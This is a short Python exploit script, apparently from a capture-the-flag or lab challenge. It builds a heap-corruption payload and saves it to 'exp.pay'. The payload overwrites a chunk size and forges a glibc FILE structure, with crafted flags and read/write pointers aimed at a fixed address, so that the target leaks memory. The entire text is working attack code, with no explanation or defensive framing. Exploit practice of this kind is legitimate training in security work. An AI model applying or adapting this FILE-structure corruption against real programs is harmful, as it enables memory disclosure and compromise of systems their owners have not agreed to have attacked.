payload = b"a" * 0x10
payload += b"\x00" * 8
payload += b"\xe1\x01"
payload += b"\x00" * 6

payload += 0xfbad0800.to_bytes(8, "little") # flags
payload += b"\x00" * 8                      # read_ptr 
payload += 0x00404050.to_bytes(8, "little") # read_end
payload += b"\x00" * 8                      # read_base 
payload += 0x00404050.to_bytes(8, "little") # write_base 
payload += (0x00404050+0x10).to_bytes(8, "little") # write_ptr 
payload += b"\x00" * 8 * 8
payload += int(1).to_bytes(8, "little")

open("exp.pay", "wb").write(payload)